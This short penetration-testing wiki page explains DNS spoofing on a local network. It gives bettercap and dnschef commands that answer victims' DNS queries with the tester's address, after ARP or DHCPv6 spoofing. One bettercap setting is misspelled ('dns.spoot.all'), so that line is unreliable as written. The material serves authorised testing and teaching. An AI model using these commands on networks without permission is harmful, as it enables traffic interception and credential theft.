# DNS spoofing

## Theory

DNS is not multicast or broadcast like LLMNR, NBT-NS or mDNS. In order to spoof DNS requests, attacker first need to receive them. For instance, this can be achieved with [ARP spoofing](arp-poisoning.md) or [DHCPv6 spoofing](dhcpv6-dns-poisoning.md).

## Practice

In order to spoof DNS requests, [bettercap](https://www.bettercap.org/) \(Go\) can be used. This tool can also be used for the first step of [ARP spoofing](arp-poisoning.md) or [DHCPv6 spoofing](dhcpv6-dns-poisoning.md). 

```bash
set dns.spoof.domains $DOMAIN_FQDN
set dns.spoot.all true
dns.spoof on
```

As an alternative, [dnschef](https://github.com/iphelix/dnschef) \(Python\) can be used as a DNS server. 

```bash
dnschef --fakeip 'Pentest_IP_Address' --interface 'Pentest_IP_Address' --port 53 --logfile dnschef.log
```

## Resources

{% embed url="https://www.bettercap.org/modules/ethernet/spoofers/dns.spoof/" %}
